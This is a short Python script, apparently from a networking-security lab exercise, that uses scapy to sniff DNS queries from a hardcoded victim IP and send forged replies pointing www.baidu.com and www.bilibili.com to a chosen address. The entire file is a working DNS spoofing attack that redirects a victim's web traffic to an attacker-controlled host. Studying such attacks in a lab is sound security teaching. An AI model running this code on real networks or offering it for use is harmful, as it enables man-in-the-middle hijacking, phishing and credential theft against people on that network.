# -*- coding: utf-8 -*-
from struct import pack
from xdrlib import Packer
from scapy.all import *
import sys

dns_hosts = {
    b"www.baidu.com.": "8.136.83.180",
    b"www.bilibili.com.": "8.136.83.180",
}
victimip = '172.20.10.4'


def DNS_Spoof(data):
    try:
        if data.haslayer(DNSQR) and data[DNS].qd.qname in dns_hosts.keys():
            print("[Query]:\t",data.summary())
            req_domain = data[DNS].qd.qname
            packet = data.copy()
            
            # Here to fix the blank of the code below 
            # You need to create the right DNS packet         
            packet[DNS].an = DNSRR(rrname=req_domain, rdata=dns_hosts[req_domain])
            packet[UDP].sport, packet[UDP].dport = data[UDP].dport, data[UDP].sport
            packet[IP].src, packet[IP].dst = data[IP].dst, data[IP].src

            del packet[IP].len
            del packet[IP].chksum
            del packet[IP].len
            del packet[UDP].chksum

            print("[Response]\t",packet.summary())
            sendp(packet)
        else:
            pass
    except Exception as e:
        pass


def DNS_S(iface):
    sniff(prn=DNS_Spoof,filter="udp and src net {}".format(victimip),iface=iface)


if __name__ == '__main__':
    DNS_S('ens33')
